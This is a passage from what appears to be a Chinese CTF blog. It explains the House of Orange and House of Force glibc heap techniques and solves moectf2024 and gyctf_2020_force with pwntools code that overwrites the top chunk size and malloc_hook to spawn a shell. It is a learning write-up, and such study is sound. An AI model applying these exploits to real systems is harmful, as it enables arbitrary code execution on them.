class="built_in">printf</span>(<span class="string">&quot;Random number: %u\n&quot;</span>, random_number);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><code>moectf2024 Catch_the_canary!</code></p><ul><li>åªçœ‹éšæœºæ•°éƒ¨åˆ†ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v3 = arc4random(argc, argv, envp);</span><br><span class="line">v4 = v3 - <span class="number">0xFEFFFFFFFFFFFF</span>LL * ((__int64)((<span class="number">0x4040404040404081</span>LL * (<span class="type">unsigned</span> __int128)v3) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">54</span>);</span><br><span class="line"></span><br><span class="line">v8 = (<span class="type">unsigned</span> <span class="type">int</span>)arc4random(argc, <span class="number">0LL</span>, v4) % <span class="number">0x2345</span> + <span class="number">16768186</span>;</span><br><span class="line">init();</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Here, my canary, with a cage.\n&quot;</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;[Info] Password required.\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line"><span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v6) == <span class="number">-1</span> || v8 != v6 )</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;[Error] Wrong! Try again.\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;[Info] Cage opened.\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Oh, but I&#x27;ve got \&quot;cageincage\&quot;\nwhich is impossible to open.\nOne shot.\n&quot;</span>, <span class="number">0x45</span>uLL);</span><br></pre></td></tr></table></figure></div><ul><li>äº§ç”Ÿçš„æ˜¯ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çˆ†ç ´å³å¯ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;required.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFDCBA</span>,<span class="number">0xFFDCBA</span>+<span class="number">0x2345</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27;] &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_Of_Orange</title>
      <link href="/2024/10/08/House-Of-Orange/"/>
      <url>/2024/10/08/House-Of-Orange/</url>
      
        <content type="html"><![CDATA[<p><strong>å‚è€ƒ</strong>ï¼š</p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="1-ä»‹ç»"><a href="#1-ä»‹ç»" class="headerlink" title="1.ä»‹ç»"></a>1.ä»‹ç»</h1><p><em><strong>house of orange åœ¨äºæˆ‘ä»¬æ²¡æœ‰freeçš„æ—¶å€™ï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°freeçš„æ•ˆæœï¼Œå°†ä¸€ä¸ªchunkæ”¾è¿›unsorted binä¸­ï¼Œç„¶åè¾¾åˆ°æ³„éœ²libcçš„æ•ˆæœ</strong></em></p><blockquote><p>æ“ä½œçš„åŸç†ç®€å•æ¥è¯´æ˜¯å½“å‰å †çš„ top chunk å°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„ top chunk ä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥ unsorted bin ä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰ free å‡½æ•°æƒ…å†µä¸‹è·å–åˆ° unsorted binsã€‚</p></blockquote><ul><li><strong>æ­£å¸¸æƒ…å†µä¸‹mallocçš„æ‰§è¡Œè¿‡ç¨‹</strong></li></ul><p>mallocè°ƒç”¨ä½äºlibc.soä¸­çš„__int_mallocå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸­ä»¥æ­¤æ£€æŸ¥fastbin,small bins,unsorted bin,large binï¼Œè‹¥è¿™äº›éƒ½ä¸æ»¡è¶³ï¼Œåˆ™åœ¨top chunkä¸­æ‰¾</p><ul><li><strong>top chunkä¹Ÿä¸æ»¡è¶³</strong></li></ul><p>æ­¤æ—¶ä¼šæ‰§è¡Œsysmallocåˆ†é…chunk</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">void</span> *p = <span class="built_in">sysmalloc</span>(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯å †åˆ†é…æœ‰mmapå’Œbrkåˆ†é…æ–¹å¼ï¼Œ<mark>æˆ‘ä»¬è¦ç”¨brkçš„åˆ†é…æ–¹å¼æ‹“å±•chunk<mark>ï¼Œè¿™æ ·ï¼Œä¹‹å‰çš„top chunkå°±ä¼šæ”¾åˆ°unsorted binä¸­ï¼Œè¿™ä¹Ÿå°±è¾¾åˆ°äº†house of orangeçš„åˆ©ç”¨</mark></mark></p><h2 id="ä¸€äº›check"><a href="#ä¸€äº›check" class="headerlink" title="ä¸€äº›check"></a>ä¸€äº›check</h2><ul><li><strong>mallocçš„å¤§å°è¦å°äºmmp_.mmap_threshold</strong>(<mark>é»˜è®¤128k<mark>)</mark></mark></li><li>sysmallocå‡½æ•°å¯¹top chunk sizeçš„check</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span>((old_top == <span class="built_in">initial_top</span>(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      <span class="built_in">prev_inuse</span>(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div><p>ç®€å•æ¥è¯´ï¼Œtop chunkçš„sizeè¦å¤§äºç­‰äºMINSIZE,top chunkçš„ç»“æŸåœ°å€å¿…é¡»æ˜¯é¡µå¯¹å…¶çš„ï¼Œtop chunkç›¸é‚»çš„å‰ä¸€ä¸ªchunkå¿…é¡»å¤„äºinuseçŠ¶æ€ã€‚</p><p><font size="4" color="red">æ€»ç»“ä¸€ä¸‹check</font></p><blockquote><p> <mark>ä¼ªé€ çš„sizeå¿…é¡»é¡µå¯¹å…¶<mark></mark></mark></p><p> <mark>sizeè¦å¤§äºMINSIZE(0x10)<mark></mark></mark></p><p> <mark>sizeè¦å°äºä¹‹åç”³è¯·çš„chunk size + MINSIZE<mark></mark></mark></p><p> <mark>sizeçš„prev inuseä½å¿…é¡»æ˜¯1<mark></mark></mark></p><p>ç„¶åtop chunkå°±ä¼šæ‰§è¡Œ_int_freeè¿›å…¥unsorted binä¸­</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_Of_Force</title>
      <link href="/2024/09/26/House-Of-Force/"/>
      <url>/2024/09/26/House-Of-Force/</url>
      
        <content type="html"><![CDATA[<h1 id="æè¦"><a href="#æè¦" class="headerlink" title="æè¦"></a>æè¦</h1><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#_2">ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>ç¥å¥‡çš„æ³„éœ²libc:é€šè¿‡mallocå¤§äºtop chunk sizeçš„chunkï¼Œæ³„éœ²å‡ºçš„chunkåœ°å€ä¸libcå­˜åœ¨å›ºå®šçš„åç§»</strong></p><h1 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h1><h2 id="è¿ç”¨æ¡ä»¶"><a href="#è¿ç”¨æ¡ä»¶" class="headerlink" title="è¿ç”¨æ¡ä»¶"></a>è¿ç”¨æ¡ä»¶</h2><ul><li><font color="red">å¯ä»¥ä¿®æ”¹top chunkçš„sizeå¤§å°</font></li><li><font color="red">å¯ä»¥æ§åˆ¶åˆ†é…ä»»æ„å¤§å°çš„chunk</font></li></ul><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>å½“æˆ‘ä»¬mallocçš„æ—¶å€™ï¼Œè‹¥æ˜¯ç©ºé—²çš„å †å—æ— æ³•æ»¡è¶³mallocçš„è¦æ±‚ï¼Œå°±ä¼šä»top chunkä¸­åˆ†å‰²åˆé€‚çš„chunk</p><ul><li><strong>å¦‚æœtop chunkçš„åˆ†é…çš„sizeæ˜¯ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€ æˆä»»æ„åœ°å€å†™</strong></li></ul><p>ä½†æ˜¯è¿™é‡Œæ¶‰åŠåˆ°top chunk sizeçš„éªŒè¯ï¼š</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span></span><br><span class="line"><span class="comment">// æ³¨æ„sizeæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´å‹</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>è¦ç»•è¿‡ç¬¬ä¸€ä¸ªéªŒè¯å¾ˆç®€å•ï¼Œåªéœ€è¦å°†sizeä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—å°±è¡Œäº†ï¼Œå¦‚0xffffffffffff,è¿™ä¹Ÿæ˜¯åˆ©ç”¨æ¡ä»¶1çš„å¿…è¦æ€§</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure></div><ul><li><p>ä¸Šè¿°ä»£ç å®ç°äº†æ›´æ–°top chunkçš„æŒ‡é’ˆï¼Œ æˆ‘ä»¬åªè¦æ§åˆ¶åˆ†é…çš„size,å°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™äº†ã€‚</p></li><li><p>å…¶ä½™çš„çœ‹å¼€å¤´æ–‡ç« ï¼Œæ³¨æ„ä¸€ä¸ªå¯¹é½è§„åˆ™ã€‚</p></li></ul><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p><a class="link" href="https://buuoj.cn/challenges#gyctf_2020_force">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="idaé€Ÿè§ˆ"><a href="#idaé€Ÿè§ˆ" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h3><p><font size="4"><strong>main</strong></font></p><ul><li>åªæœ‰ä¸€ä¸ªaddåŠŸèƒ½</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1:add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2:puts&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xFuLL</span>);</span><br><span class="line">    v3 = <span class="built_in">atol</span>(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">show</span>();                                   <span class="comment">// æ²¡ä»€ä¹ˆç”¨çš„puts</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><font size="4"><strong>add</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926131129316.bmp"></p><h3 id="æ€è·¯åˆ†æ-æœ¬åœ°è¿è¡Œåˆ†æ"><a href="#æ€è·¯åˆ†æ-æœ¬åœ°è¿è¡Œåˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ(æœ¬åœ°è¿è¡Œåˆ†æ)"></a>æ€è·¯åˆ†æ(æœ¬åœ°è¿è¡Œåˆ†æ)</h3><ul><li>åªæœ‰ä¸€ä¸ªaddå‡½æ•°ï¼Œåªè¦malloc sizeå°äº0x50ï¼Œå°±å­˜åœ¨å †æº¢å‡ºï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹top chunk size</li></ul><p><font size="4" color="red"><strong>æ³„éœ²Libc</strong></font></p><ul><li>ä½†æ˜¯å¦‚ä½•æ³„éœ²libcå‘¢ï¼Ÿå¦‚å¼€å¤´æ‰€è¯´ï¼Œç¥å¥‡çš„æ³„éœ²libcï¼Œæˆ‘ä»¬mallocä¸€ä¸ªå¾ˆå¤§çš„sizeï¼Œæ­¤æ—¶æ˜¯é€šè¿‡mmapåˆ†é…çš„chunkï¼Œè¯¥chunkçš„åœ°å€å’Œlibcå­˜åœ¨å›ºå®šçš„åç§»ï¼Œå¦‚ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span> <span class="comment"># libcæ–‡ä»¶ä¸åŒï¼Œåç§»ä¸åŒ</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926132253352.bmp"></p><ul><li>å·¦è¾¹å°±æ˜¯æ³„éœ²çš„åœ°å€ï¼Œå³è¾¹æ˜¯libcçš„åœ°å€ï¼Œå›ºå®šåç§»åœ¨gdbé‡Œé¢ç”¨distanceæ±‚ä¸€ä¸‹å³å¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†libcçš„åŸºåœ°å€</li></ul><p><font size="4" color="red">å®ç°HOF</font></p><ul><li>æ¥ä¸‹æ¥å°±æ˜¯ä¿®æ”¹topchunkçš„size,å¹¶ä¸”ä¸ºä¿®æ”¹malloc_hookåšå¥½å‡†å¤‡</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ‰å †æº¢å‡ºï¼Œå¯æ‰“House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunkåœ¨è¯¥chunkçš„+0x10å¤„</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147]  # è¿œç¨‹ç¯å¢ƒçš„onegadget</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># æœ¬åœ°åç§»</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br></pre></td></tr></table></figure></div><ul><li>ç®€å•çš„æº¢å‡ºä¿®æ”¹top chunk çš„ sizeï¼Œå¹¶ä¸”é€šè¿‡chunk0è·å¾—top chunkçš„åœ°å€ï¼Œé€šè¿‡libcåŸºåœ°å€è·å¾—å¯¹åº”å‡½æ•°åœ°å€</li><li><strong>ä¸‹é¢å°±æ˜¯ä»»æ„åœ°å€å†™äº†ï¼Œå…ˆè¦ç¡®å®šoffsetæ˜¯å¤šå°‘ã€‚</strong>è¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹malloc_hookå‡½æ•°ä¸ºonegadget,é‚£ä¹ˆoffset å°±æ˜¯malloc_hook - top chunk</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br></pre></td></tr></table></figure></div><ul><li>åç§»ç¡®è®¤å®Œæˆï¼Œæ­£å¼çš„è¿ç”¨å´æ˜¯offset-0x20ï¼Œ-0x10ç”¨äºå¯¹äºï¼Œ-0x10å°†malloc_hookæ”¾åˆ°user dataéƒ¨åˆ†</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(onegadget))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926190835186.bmp"></p><ul><li>æœ€ååªéœ€è¦å†æ¬¡è°ƒç”¨mallocå³å¯ï¼Œä½†æ˜¯å¯ä»¥å‘ç°ï¼Œå°†onegadgetéƒ½è¯•å®Œï¼Œä¹Ÿæ˜¯æ— æ³•getshellçš„ï¼Œä¸ºä»€ä¹ˆå‘¢?</li></ul><p><font size="4" color="red">reallocå’Œmallocå…±åŒåˆ©ç”¨</font></p><ul><li>å‚è€ƒæˆ‘å†™çš„ï¼š[è¿™ç¯‡æ–‡ç« ](<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ã€Šfastbin_attackã€‹)</li><li>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°†offset-0x10ï¼Œå»ä¿®æ”¹realloc_hookä¸ºonegadgetï¼Œç„¶åå°†mallocå‡½æ•°ä¿®æ”¹ä¸ºrealloc+nçš„ä½ç½®(ä¹Ÿæ˜¯éœ€è¦å°è¯•çš„ï¼Œä¸€èˆ¬æ˜¯0x4)</li><li>å½“æˆ‘ä»¬è°ƒç”¨mallocçš„æ—¶å€™ï¼Œå…ˆæ‰§è¡Œpush,å°†rspå¾€ä½åœ°å€è°ƒï¼Œç„¶åæ‰§è¡Œrealloc_hookå³onegadgetï¼Œä»è€Œgetshell.</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926192847620.bmp"></p><h3 id="æœ¬åœ°å®Œæ•´EXP"><a href="#æœ¬åœ°å®Œæ•´EXP" class="headerlink" title="æœ¬åœ°å®Œæ•´EXP"></a>æœ¬åœ°å®Œæ•´EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>) <span class="comment"># æœ¬åœ°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span 